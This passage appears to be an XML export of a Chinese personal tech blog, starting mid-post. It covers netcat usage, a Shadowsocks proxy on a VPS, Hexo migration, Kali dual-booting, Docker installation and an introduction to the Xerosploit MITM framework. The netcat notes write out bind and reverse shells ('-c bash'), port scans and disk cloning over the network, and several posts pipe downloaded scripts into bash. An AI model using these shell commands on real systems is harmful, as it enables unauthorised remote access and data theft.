aaa.txt | nc -nv 0.0.0.0 333 -q 1</code></pre><h4 id="流媒体服务器"><a href="#流媒体服务器" class="headerlink" title="流媒体服务器"></a>流媒体服务器</h4><pre><code>cat 1.mp4 |  nc -lp 333nc -nv 0.0.0.0 333 | mplayer -vo x11 -cache 3000 -</code></pre><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre><code>nc -nvz 0.0.0.0 1-65535nc -nvzu 0.0.0.0 1-1024(查看1-1024的udp端口)</code></pre><h4 id="远程克隆硬盘"><a href="#远程克隆硬盘" class="headerlink" title="远程克隆硬盘"></a>远程克隆硬盘</h4><pre><code>nc -lp 333 | dd of=/dev/sdadd if=/dev/sda | nc -nv 0.0.0.0 333 -q 1</code></pre><h4 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h4><h5 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h5><pre><code>nc -lp 333 -c bash(Windows用cmd)nc -nv 0.0.0.0 333</code></pre><h5 id="反向（在目标服务器开启可连端口执行nc就可以实现第二次访问）"><a href="#反向（在目标服务器开启可连端口执行nc就可以实现第二次访问）" class="headerlink" title="反向（在目标服务器开启可连端口执行nc就可以实现第二次访问）"></a>反向（在目标服务器开启可连端口执行nc就可以实现第二次访问）</h5><pre><code>nc -lp 333nc -nv 0.0.0.0 333 -c bash-c bash 就是可获取本地的bash窗口(在哪里获取哪里的)</code></pre><h4 id="ncat-由于nc是不加密的，明文传输容易被嗅探，我们也可以用ncat"><a href="#ncat-由于nc是不加密的，明文传输容易被嗅探，我们也可以用ncat" class="headerlink" title="ncat(由于nc是不加密的，明文传输容易被嗅探，我们也可以用ncat)"></a>ncat(由于nc是不加密的，明文传输容易被嗅探，我们也可以用ncat)</h4><p><strong>建立远程连接(ssl加密)</strong></p><pre><code>ncat -c bash --allow 0.0.0.0 -nvl 333 --ssl(--allow允许一个指定IP连接)ncat -nv 0.0.0.0 333 --ssl</code></pre>]]></content>
    
    
    <categories>
      
      <category>Kali学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VPS+SS组建个人的科学上网服务器</title>
    <link href="/2019/02/06/VPS-SS%E7%BB%84%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%9A%84%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/2019/02/06/VPS-SS%E7%BB%84%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%9A%84%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>在这片神州大地上有一堵长城防火墙使我们与世隔绝，犹如进击的巨人中巨大的墙一样保护我们的同时限制着我们观察世界。既然国情如此，我们只要不发布任何不利的信息自己看看应该也是可以的吧。</p><h3 id="关于翻墙的原理"><a href="#关于翻墙的原理" class="headerlink" title="关于翻墙的原理"></a>关于翻墙的原理</h3><p>emmm，其实在我仅知道的几种方式都是需要一个国外的节点滴，通过点对点的连接。比如openvpn兼容比较不错，最近好像说又被墙封了。除了这里要讲的ssr，个人觉得pptp也是不错的方式（学习ss时了解滴，主要不知道这个在移动端怎么用所以也就放弃了）。<br><a id="more"></a></p><h3 id="拥有一个属于自己的VPS"><a href="#拥有一个属于自己的VPS" class="headerlink" title="拥有一个属于自己的VPS"></a>拥有一个属于自己的VPS</h3><p>这个肯定是需要自己掏腰包租用的，不过也有一些网站会定期分享一些寿命不长了的VPS搭建的ss帐号。</p><h4 id="1-在V社（Vulter）注册一个帐号"><a href="#1-在V社（Vulter）注册一个帐号" class="headerlink" title="1.在V社（Vulter）注册一个帐号"></a>1.在V社（Vulter）注册一个帐号</h4><p>点击这里——–<a href="https://www.vultr.com/" target="_blank" rel="noopener">网址</a></p><p><img src="https://i.loli.net/2019/02/06/5c5aa94870171.png" srcset="/img/loading.gif" alt="注册"></p><h4 id="2-账户充值"><a href="#2-账户充值" class="headerlink" title="2.账户充值"></a>2.账户充值</h4><p><img src="https://i.loli.net/2019/02/06/5c5aa9c5acef4.png" srcset="/img/loading.gif" alt="充值"><br>这里我们选第三或第四个（支付宝或微信支付），现在的活动是充10美元送50美元。</p><h4 id="3-租个人服务器"><a href="#3-租个人服务器" class="headerlink" title="3.租个人服务器"></a>3.租个人服务器</h4><p>点击左边的Servers然后io点右边的加号<br><img src="https://i.loli.net/2019/02/06/5c5aa9db56d5e.png" srcset="/img/loading.gif" alt="servers"><br>选择服务器的国家，最近日本、新加坡、硅谷的服务器IP的端口被封了，所以不能用ssh远程连接了，不过网页里有一个是可以连接服务器的，但输入密码就麻烦了点。<br><img src="https://i.loli.net/2019/02/06/5c5aa9fa9d76d.png" srcset="/img/loading.gif" alt="国家"><br>然后选择服务器的系统（有钱可以用windows）和服务器的硬件性能<br><img src="https://i.loli.net/2019/02/06/5c5aaa16c4286.png" srcset="/img/loading.gif" alt="服务器"><br>然后点Deploy Now，等待服务器初始化启动就好。<br>当status running后，点击os下的系统图标，进入服务器状态界面，左边有服务器的IP、帐号及密码是我们接下来需要用的，如果22端口开着就可以通过远程连接服务器。<br>点击这里<a href="https://tool.lu/portscan/" target="_blank" rel="noopener">端口扫描</a><br>输入服务器ip，检测22端口是否open<br>如果没有22端口就表示被长城防火墙隔离了，就可以用下图左上角pc图标来连接<br><img src="https://i.loli.net/2019/02/06/5c5aaa16bd9f4.png" srcset="/img/loading.gif" alt="telnet"></p><h4 id="4-安装shadowsocks"><a href="#4-安装shadowsocks" class="headerlink" title="4.安装shadowsocks"></a>4.安装shadowsocks</h4><pre><code>wget --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</code></pre><pre><code>chmod +x shadowsocks.sh</code></pre><pre><code>./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</code></pre><p>最好这条执行后按回车键执行，接下来是输入ss的密码、端口（不要用80、21、23这样的，自己想一个比如2333）、加密方式（听说iphone用户只支持到aes-256-cfb）选择你想要的，反正我选的是7（256的这个）。<br>然后等待几分钟，直到出现以下画面<br><img src="https://i.loli.net/2019/02/06/5c5aaa6b5be33.png" srcset="/img/loading.gif" alt="success"><br>这样你的ss就搭建好了。<br>接下来只要下shadowsocks客户端就好了，windows设置完后要右键小飞机选择本地代理才可以使用。。。（因为这个原因我一直以为自己弄的有问题，重新做了好几遍）</p><h4 id="5-安装BBR（学长的推荐-因为比较稳）"><a href="#5-安装BBR（学长的推荐-因为比较稳）" class="headerlink" title="5.安装BBR（学长的推荐,因为比较稳）"></a>5.安装BBR（学长的推荐,因为比较稳）</h4><pre><code>wget --no-check-certificate https://raw.githubusercontent.com/wn789/BBR/master/bbr.sh</code></pre><pre><code>chmod +x bbr.sh</code></pre><pre><code>./bbr.sh</code></pre><pre><code>lsmod | grep bbr 查看BBR是否启动，返回值有 tcp_bbr表示已启动</code></pre><h4 id="6-安装BBR魔改版（速度比BBR起提升非常大，但并不是特别稳定——不过比起BBR的确推荐这个）"><a href="#6-安装BBR魔改版（速度比BBR起提升非常大，但并不是特别稳定——不过比起BBR的确推荐这个）" class="headerlink" title="6.安装BBR魔改版（速度比BBR起提升非常大，但并不是特别稳定——不过比起BBR的确推荐这个）"></a>6.安装BBR魔改版（速度比BBR起提升非常大，但并不是特别稳定——不过比起BBR的确推荐这个）</h4><pre><code>yum install -y wget &amp;&amp; wget --no-check-certificate -O C71.sh https://raw.githubusercontent.com/xratzh/CBBR/master/C71.sh &amp;&amp; bash C71.sh</code></pre><pre><code>wget --no-check-certificate -O C72.sh https://raw.githubusercontent.com/xratzh/CBBR/master/C72.sh &amp;&amp; bash C72.sh</code></pre><h4 id="7-安装锐速（亲测速度提升的比起BBR快的不止一点点）"><a href="#7-安装锐速（亲测速度提升的比起BBR快的不止一点点）" class="headerlink" title="7.安装锐速（亲测速度提升的比起BBR快的不止一点点）"></a>7.安装锐速（亲测速度提升的比起BBR快的不止一点点）</h4><p>如果已经用BBR加速了的话，就不能用这个了，如果你租的服务器延迟很高用这个比较好。</p><pre><code>wget --no-check-certificate -O rskernel.sh https://raw.githubusercontent.com/uxh/shadowsocks_bash/master/rskernel.sh &amp;&amp; bash rskernel.sh</code></pre><pre><code>yum install net-tools -y &amp;&amp; wget --no-check-certificate -O appex.sh https://raw.githubusercontent.com/0oVicero0/serverSpeeder_Install/master/appex.sh &amp;&amp; bash appex.sh install</code></pre><p>这里一直回车就好，显示running表示锐速安装成功而且开机自启了。</p><h5 id="至于魔改BBR和锐速（魔改的可能会更快点，锐速比较稳定）"><a href="#至于魔改BBR和锐速（魔改的可能会更快点，锐速比较稳定）" class="headerlink" title="至于魔改BBR和锐速（魔改的可能会更快点，锐速比较稳定）"></a>至于魔改BBR和锐速（魔改的可能会更快点，锐速比较稳定）</h5><h4 id="8-Kcptun安装配置"><a href="#8-Kcptun安装配置" class="headerlink" title="8.Kcptun安装配置"></a>8.Kcptun安装配置</h4><pre><code>wget --no-check-certificate https://github.com/kuoruan/shell-scripts/raw/master/kcptun/kcptun.sh</code></pre><pre><code>chmod +x ./kcptun.sh</code></pre><pre><code>./kcptun.sh</code></pre><p>里面的配置参数差不多是这样<br>{  “fubitechaladdr”: “:8388”,  “remoteaddr”: “10.10.10.10:29900”,  “key”: “123456”,  “crypt”: “salsa20”,  “mode”: “fast”,  “mtu”: 1350,  “sndwnd”: 1024,  “rcvwnd”: 1024,  “datashard”: 10,  “parityshard”: 3,  “dscp”: 0,  “conn”: 1,  “autoexpire”: 60,  “nocomp”: false}<br>即客户端的参数，上面没有的部分比如是否压缩什么的直接回车就好了</p><h5 id="Kcptun客户端（居然在我这里没什么软用，其他同学可以试试，说不定只是我没配好）"><a href="#Kcptun客户端（居然在我这里没什么软用，其他同学可以试试，说不定只是我没配好）" class="headerlink" title="Kcptun客户端（居然在我这里没什么软用，其他同学可以试试，说不定只是我没配好）"></a>Kcptun客户端（居然在我这里没什么软用，其他同学可以试试，说不定只是我没配好）</h5><p>1.<a href="https://github.com/dfdragon/kcptun_gclient/releases" target="_blank" rel="noopener">客户端</a><br>2.<a href="https://github.com/xtaci/kcptun/releases" target="_blank" rel="noopener">配置文件</a>（服务器配置成功后好像在客户端配置的上面有配置文件的版本，所以下载的时候也要下相同滴）<br>然后新建一个文件比如config.json，把服务器端最后生成的客户端配置复制到里面<br>这些都完成后打开客户端启动什么的（因为很简单相信大家都会就懒得截图了）。。。<br>最后再到shadowsocks客户端里新建一个，服务器IP和端口为Kcptun客户端的。（都说速度稳了内存和CPU占用率也低了。。。我能看到传输时的反应，可效果却是访问youtobe—500）<br>kalishadowsocks设置<br>1.在/etc/apt/sources.list末尾添加: deb <a href="http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu" target="_blank" rel="noopener">http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu</a> devel main<br>2.apt update 这里会提示错误，以下两步解决该错误<br>gpg –keyserver keyserver.ubuntu.com –recv 6DA746A05F00FA99<br>gpg –export –armor 6DA746A05F00FA99 | sudo apt-key add -<br>apt update 这一步成功后便可安装shadowsocks-qt5了<br>3.安装shadowsocks-qt5: apt install shadowsocks-qt5 安装后在bash中输入ss-qt5, 完成配置<br>4.获得pac文件：<br>pip install genpac<br>pip install –upgrade genpac<br>mkdir vpnPAC<br>cd vpnPAC<br>touch user-rules.txt<br>genpac -p “SOCKS5 127.0.0.1:1080” –gfwlist-proxy=”SOCKS5 127.0.0.1:1080” –output=”autoproxy.pac” –gfwlist-url=”<a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt&quot;" target="_blank" rel="noopener">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt&quot;</a> –user-rule-from=”user-rules.txt”<br>5.系统设置自动代理: 设置-网络-网络代理 方式改为自动，配置URL改为：file:///home/{user}/vpnPAC/autoproxy.pac或file:///root/vpnPAC/autoproxy.pac</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VPN</tag>
      
      <tag>科学上网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hexo迁移至Linux教程及遇到的一些问题</title>
    <link href="/2019/01/12/Hexo%E8%BF%81%E7%A7%BB%E5%88%B0Linux%E6%95%99%E7%A8%8B%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <url>/2019/01/12/Hexo%E8%BF%81%E7%A7%BB%E5%88%B0Linux%E6%95%99%E7%A8%8B%E5%8F%8A%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>Linux在服务方面的确比windows要容易学明白一些所以最近笔者在美化自己的博客时发现有个文件怎么都删不掉，然后又想给自己的域名弄个https，由于在windwos上操作实在是太过繁琐，索性直接搬家到linux。</p><h2 id="Hexo是什么？"><a href="#Hexo是什么？" class="headerlink" title="Hexo是什么？"></a>Hexo是什么？</h2><p>这里有必要普及一下—–<br>Hexo是一个快速, 简洁且高效的博客框架. 让上百个页面在几秒内瞬间完成渲染. Hexo支持Github Flavored Markdown的所有功能, 甚至可以整合Octopress的大多数插件. 并自己也拥有强大的插件系统.</p><a id="more"></a><p>##如何在Linux下完成hexo的环境配置<br>nodejs,npm以及git<br>直接贴代码</p><pre><code>apt-get install git</code></pre><p>千万不要自作聪明用apt装了npm和nodejs哦，会出现很多问题的，比如版本太低什么的<br>研究了半天发现一个好东西—–nvm</p><p>这里科普一下（nvm是Node版本管理器，可以运行在多种操作系统上。nvm for windows 是使用go语言编写的软件。 我电脑使用的是Windows操作系统，所以我要记录下在此操作系统上nvm的安装和使用。）<br>OK，这么厉害的东西当然要下一个</p><pre><code>wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.31.1/install.sh | bash</code></pre><p>也可以这样</p><pre><code>curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.1/install.sh | bash</code></pre><p>装好了别急着用我们还要source一下，不然用不了的</p><pre><code>source ~/.bashrc</code></pre><p>有了这个差不多算磨好刀了</p><p>##安装Hexo</p><pre><code>npm install hexo-cli -g</code></pre><p>成功后开始搭建博客系统</p><pre><code>hexo init blog（这里的blog是别名---等会生成的文件夹就是这个，你也可以自己取一个）cd blognpm install</code></pre><p>绑定Github</p><pre><code>git config --global user.name &quot;&quot;git config --global user.email &quot;&quot;</code></pre><p>将windows原博客中的source theme _config.yml copy进来，如果你+了各种奇奇怪怪的美化文件那也copy进来吧<br>然后</p><pre><code>hexo g hexo d</code></pre><p>。。。。。<br>哪有这么简单就好了，以前搭博客时装的东西这里也要装一遍</p><p>##比如hexo d会失败<br>无法同步就是因为你忘了这个</p><pre><code>npm install hexo-deployer-git --save</code></pre><p>还有还有，之前弄的ssh密钥到这里就不能用了要重新生成</p><pre><code>cd ~/.sshssh-keygen -t rsa -C &quot;XXX@XXX.COM&quot;(回车三次)</code></pre><p>找到密钥文件，将里面的东西跟github绑定（settings–&gt;SSH GPG keys）<br>再ADD一个就好了</p><pre><code>ssh -T git@github,com(测试一下)</code></pre><p>恩，这样就可以同步了。</p><p>##还有一些小东西可能你会用的到哦！！！</p><h3 id="hexo-admin"><a href="#hexo-admin" class="headerlink" title="hexo-admin"></a>hexo-admin</h3><p>实现全自动发布文章（hexo g -d），在线拷图还能实时查看<br>安装安装</p><pre><code>npm install --save hexo-adminhexo s</code></pre><p>在根配置文件里加入</p><pre><code>admin: username: zoro password_hash:be121740bf988b2225a313fa1f107ca1 //用户名密码不喜欢的可以不设置，这里通 过bcrypt hash secret: hey hexo deploy//用以cookies安全</code></pre><p>在localhost:4000后面加/admin就可以进行在线编辑了</p><h3 id="这里还有一个看版娘（灰常可爱的小东西，喜欢也可以-一个）"><a href="#这里还有一个看版娘（灰常可爱的小东西，喜欢也可以-一个）" class="headerlink" title="这里还有一个看版娘（灰常可爱的小东西，喜欢也可以+一个）"></a>这里还有一个看版娘（灰常可爱的小东西，喜欢也可以+一个）</h3><pre><code>npm install --save hexp-helper-live2d</code></pre><h4 id="在根配置文件里加入"><a href="#在根配置文件里加入" class="headerlink" title="在根配置文件里加入"></a>在根配置文件里加入</h4><pre><code>live2d:   enable: true   scriptFrom: local   pluginRootPath: live2dw/   pluginJsPath: lib/   pluginModelPath: assets/   tagMode: false   debug: false model:   use: live2d-widget-model-miku display:   position: right   width: 150   height: 300   mobile:show: true</code></pre><p>下载自定义模型，在根目录创建一个文件夹live2d_models，然后把模型copy进去将model里的user设置成模型文件的名字就好了</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows-Kali双系统安装教程</title>
    <link href="/2019/01/06/Windows-Kali%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
    <url>/2019/01/06/Windows-Kali%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>给你的电脑另一种打开方式</p><p>大家都知道除了Windows之外还有很多操作系统，其中有一个是Linux，而kali是Linux中一个很特别的系统。。。。。。。。。。</p><h2 id="Kali简介"><a href="#Kali简介" class="headerlink" title="Kali简介"></a>Kali简介</h2><p>Kali Linux是基于<a href="https://baike.baidu.com/item/Debian/748667" target="_blank" rel="noopener">Debian</a>的Linux发行版， 设计用于数字取证操作系统。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。</p><p>Kali Linux预装了许多渗透测试软件，包括nmap 、Wireshark 、John the Ripper，以及Aircrack-ng.[2] 用户可通过硬盘、live CD或live USB运行Kali Linux。Kali Linux既有32位和64位的镜像。可用于x86 指令集。同时还有基于ARM架构的镜像，可用于树莓派和三星的ARM Chromebook。</p><a id="more"></a><h2 id="安装前必要的操作"><a href="#安装前必要的操作" class="headerlink" title="安装前必要的操作"></a>安装前必要的操作</h2><p>1.分一个存储空间给kali</p><p>2.一个8G及以上的U盘</p><p>3.安装软碟通或Win32DiskImager</p><p>4.下载kali<a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">镜像文件</a></p><h2 id="给kali一个属于自己的房子"><a href="#给kali一个属于自己的房子" class="headerlink" title="给kali一个属于自己的房子"></a>给kali一个属于自己的房子</h2><p>在磁盘管理中选择一个不需要的分区右键-删除卷或者右键-压缩卷(自己分配多大空间给kali)</p><p><img src="http://thyrsi.com/t6/650/1546764477x2890149566.png" srcset="/img/loading.gif" alt=""></p><p>这里是我给kali的空间(在D-E中间的三个分区)</p><p>当你删除后会有一个未分配的空间，比如</p><p><img src="http://thyrsi.com/t6/650/1546764584x2890211738.png" srcset="/img/loading.gif" alt=""></p><p>黑色的就是不属于Windows而是给kali1的安装位置</p><h2 id="制作kali启动盘"><a href="#制作kali启动盘" class="headerlink" title="制作kali启动盘"></a>制作kali启动盘</h2><h3 id="使用软碟通"><a href="#使用软碟通" class="headerlink" title="使用软碟通"></a>使用软碟通</h3><p>1.选择放有iso文件的文件夹</p><p><img src="http://thyrsi.com/t6/650/1546764645x2890211738.png" srcset="/img/loading.gif" alt=""></p><p>双击iso文件</p><p><img src="http://thyrsi.com/t6/650/1546764711x2890149637.png" srcset="/img/loading.gif" alt=""></p><p>点击启动，选择写入硬盘映像</p><p><img src="http://thyrsi.com/t6/650/1546764728x2890149637.png" srcset="/img/loading.gif" alt=""></p><p>这里要将写入方式改为<strong>raw</strong>！，然后点击写入即可(如果写入后出现是否格式化U盘，一定不要点，不然就白做了)</p><h3 id="使用Win32DiskImager"><a href="#使用Win32DiskImager" class="headerlink" title="使用Win32DiskImager"></a>使用Win32DiskImager</h3><p>选择映像文件，再点击写入即可</p><p><img src="http://thyrsi.com/t6/650/1546764760x2890149637.png" srcset="/img/loading.gif" alt=""></p><h2 id="进入BIOS关闭SecureBoot"><a href="#进入BIOS关闭SecureBoot" class="headerlink" title="进入BIOS关闭SecureBoot"></a>进入BIOS关闭SecureBoot</h2><p><img src="http://thyrsi.com/t6/650/1546764789x2890149637.jpg" srcset="/img/loading.gif" alt=""></p><p>然后重启电脑选择U盘启动。</p><h2 id="安装kali"><a href="#安装kali" class="headerlink" title="安装kali"></a>安装kali</h2><p>选择start installer</p><p><img src="http://thyrsi.com/t6/650/1546764847x2890149637.png" srcset="/img/loading.gif" alt=""></p><p>选择中文。。。。</p><p>选择网卡(默认第一个是已经配置完成的网卡第二个是没配的，为了方便(懒)选择第一个好了)</p><p><img src="http://thyrsi.com/t6/650/1546764907x2890149859.png" srcset="/img/loading.gif" alt=""></p><p>设置主机名，域名(默认，空着就行了)，root密码</p><p><img src="http://thyrsi.com/t6/650/1546764929x2890149859.png" srcset="/img/loading.gif" alt=""></p><p>选择手动分区，只分/，/home，swap(交换分区)，<strong>不要自作聪明分了/boot和efi(如果分了会启动不了kali)</strong></p><p>这里进行分区的位置就是上面你删除卷或压缩卷的位置(空闲空间)</p><p><img src="http://thyrsi.com/t6/650/1546764961x2890149859.png" srcset="/img/loading.gif" alt=""></p><p>然后reboot选择kali启动</p><p><img src="http://thyrsi.com/t6/650/1546764992x2890149859.png" srcset="/img/loading.gif" alt=""></p><p>如果卡在小黑板那是显卡驱动的问题</p><p>1.重启电脑<br>2.选择kali启动，在进入上面这张图时按E<br>3.找到quiet在后面加nouveau.modeset=0(quiet后面要加空格)<br>4.最后按F10进入系统</p><p>强行加一波长度。。。。。。</p><p>在终端输入</p><p>sed ‘s/quiet/quiet nouveau.modeset=0/g’ -i /etc/default/grub<br>update-grub</p><p>接下来怎么操作就看各位自己了</p><p><img src="http://thyrsi.com/t6/650/1546765047x2890149859.jpg" srcset="/img/loading.gif" alt=""></p><p>进入kali后碰到问题的一些小笔记</p><p>解析不了host域名<br>在/etc/resolv.conf中加入<br>nameserver 8.8.8.8—谷歌IP<br>nameserver 223.5.5.5—阿里云IP<br>nameserver 180.76.76.87—百度IP</p><p>更新软件列表并更新软件<br>apt-get update &amp; apt-get upgeade -y</p><p>升级操作系统<br>apt-get dist-upgrade -y(软件包更新过程失败可以用dpkg –configure -a修复)</p><p>apt-get 报错404<br>换源(最暴力的解决方法)在/etc/apt/source.list里<br>deb <a href="http://http.kali.org/kali" target="_blank" rel="noopener">http://http.kali.org/kali</a> kali-rolling main contrib non-free<br>deb <a href="http://old.kali.org/kali" target="_blank" rel="noopener">http://old.kali.org/kali</a> sana main non-free contrib</p><p>数字签名错误<br>wget -q -O - <a href="https://archive.kali.org/archive-key.asc" target="_blank" rel="noopener">https://archive.kali.org/archive-key.asc</a> | apt-key add</p><p>无法获取锁(删掉出错的文件位置即可)<br>rm /var/cache/apt/archives/lock<br>rm /var/lib/dpkg/lock</p><p>​                            <strong>这个系统很强，但是要搞事情一定要想清楚自己是否能承担带来的后果</strong></p><p><img src="http://thyrsi.com/t6/650/1546765038x2728278728.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Kali学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker安装</title>
    <link href="/2018/12/27/Docker%E5%AE%89%E8%A3%85/"/>
    <url>/2018/12/27/Docker%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h2 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h2><p>Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。</p><h2 id="Docker-架构"><a href="#Docker-架构" class="headerlink" title="Docker 架构"></a>Docker 架构</h2><p>Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。Docker 容器通过 Docker 镜像来创建。容器与镜像的关系类似于面向对象编程中的对象与类。</p><a id="more"></a><h2 id="docker安装教程-失败版—总有一些看似成功的代码让你误入歧途"><a href="#docker安装教程-失败版—总有一些看似成功的代码让你误入歧途" class="headerlink" title="docker安装教程(失败版—总有一些看似成功的代码让你误入歧途)"></a>docker安装教程(失败版—总有一些看似成功的代码让你误入歧途)</h2><h5 id="查看内核版本（版本号要在3-10及以上）"><a href="#查看内核版本（版本号要在3-10及以上）" class="headerlink" title="查看内核版本（版本号要在3.10及以上）"></a>查看内核版本（版本号要在3.10及以上）</h5><pre><code>uname -r</code></pre><h5 id="将yum源确保是最新的"><a href="#将yum源确保是最新的" class="headerlink" title="将yum源确保是最新的"></a>将yum源确保是最新的</h5><pre><code>yum update</code></pre><h5 id="添加yum仓库"><a href="#添加yum仓库" class="headerlink" title="添加yum仓库"></a>添加yum仓库</h5><pre><code>tee /etc/yum.repos.d/docker.repo &lt;&lt;-&#39;EOF&#39;[dockerrepo]name=Docker Repositorybaseurl=https://yum.dockerproject.org/repo/main/centos/$releasever/enabled=1gpgcheck=1gpgkey=https://yum.dockerproject.org/gpgEOF</code></pre><h5 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h5><p>yum install -y docker-engine</p><p>然后就没有然后了，反正我是装不上的</p><h5 id="还有一些什么必装的工具"><a href="#还有一些什么必装的工具" class="headerlink" title="还有一些什么必装的工具"></a>还有一些什么必装的工具</h5><p>yum install -y yum-utils device-mapper-persistent-data lvm2</p><h5 id="添加docker安装的地址"><a href="#添加docker安装的地址" class="headerlink" title="添加docker安装的地址"></a>添加docker安装的地址</h5><pre><code>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code></pre><h5 id="安装docker-ce"><a href="#安装docker-ce" class="headerlink" title="安装docker-ce"></a>安装docker-ce</h5><pre><code>yum install -y docker-ce</code></pre><h5 id="查看可安装的版本-主要是这个我以为已经接近成功了"><a href="#查看可安装的版本-主要是这个我以为已经接近成功了" class="headerlink" title="查看可安装的版本(主要是这个我以为已经接近成功了)"></a>查看可安装的版本(主要是这个我以为已经接近成功了)</h5><pre><code>yum list docker-ce --showduplicates | sort -r</code></pre><p>然后装你想要的docker版本</p><pre><code>yum install -y docker-ce--&lt;version&gt;</code></pre><p>结果就是出现了跟上面一样的错误？？?</p><p><img src="http://thyrsi.com/t6/644/1546006051x2728287514.png" srcset="/img/loading.gif" alt="error"></p><h2 id="正确的Docker安装教程-反正我装上去了的"><a href="#正确的Docker安装教程-反正我装上去了的" class="headerlink" title="正确的Docker安装教程(反正我装上去了的)"></a>正确的Docker安装教程(反正我装上去了的)</h2><p>rpm -iUvh <a href="http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm" target="_blank" rel="noopener">http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</a></p><p> <img src="http://thyrsi.com/t6/644/1546005850x2728286644.png" srcset="/img/loading.gif" alt="first"></p><p>yum install -y docker-io</p><p><img src="http://thyrsi.com/t6/644/1546006014x2728287514.png" srcset="/img/loading.gif" alt="last"></p><h3 id="最后解释一下发错误安装步骤的原因"><a href="#最后解释一下发错误安装步骤的原因" class="headerlink" title="最后解释一下发错误安装步骤的原因"></a>最后解释一下发错误安装步骤的原因</h3><p>1.有些东西可能是能用的，只是本人技术不到家不知道错误在哪里而已</p><p>2.上面有些装的工具在以后对你可能有帮助(yum-config-manager)</p><p>3.只有经历了错误才会有所成长</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xerosploit</title>
    <link href="/2018/10/24/xerosploit%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85/"/>
    <url>/2018/10/24/xerosploit%E6%A1%86%E6%9E%B6%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p>一个灰常流逼的框架</p><h2 id="xerosploit-中间人攻击框架"><a href="#xerosploit-中间人攻击框架" class="headerlink" title="xerosploit(中间人攻击框架)"></a>xerosploit(中间人攻击框架)</h2><p>xerosploit是一个渗透测试工具集，它的目的是执行中间人攻击来进行测试，包含了各种各样的模块来实现高效的攻击，同时也能执行dos攻击和端口扫描。由bettercap和nmap提供支持。</p><a id="more"></a><p><img src="http://thyrsi.com/t6/640/1545622871x2890202815.jpg" srcset="/img/loading.gif" alt="xerosploit"></p><p>OK，废话不多说直接上教程</p><h3 id="我们需要装一个git，emmm毕竟我们要下载这个文件-装过的同学直接跳过此部"><a href="#我们需要装一个git，emmm毕竟我们要下载这个文件-装过的同学直接跳过此部" class="headerlink" title="我们需要装一个git，emmm毕竟我们要下载这个文件(装过的同学直接跳过此部)"></a>我们需要装一个git，emmm毕竟我们要下载这个文件(装过的同学直接跳过此部)</h3><p>yum install -y git </p><p>查看版本号(git –version)</p><p>不知道为什么本人就安装了这个发现就可以直接运行了git clone了</p><p>如何发现不行的话可以配一下git环境哦！！！</p><p>下载git源码</p><p>先cd /usr/src存放包</p><p>wget <a href="https://www.kernel.org/pub/software/scm/git/git-2.8.3.tar.gz" target="_blank" rel="noopener">https://www.kernel.org/pub/software/scm/git/git-2.8.3.tar.gz</a></p><p>tar -zxvf git-2.8.3.tar.gz</p><p>cd git-2.8.3</p><p>配置git安装路径</p><p>./configure prefix-=/usr/local/git/（<a 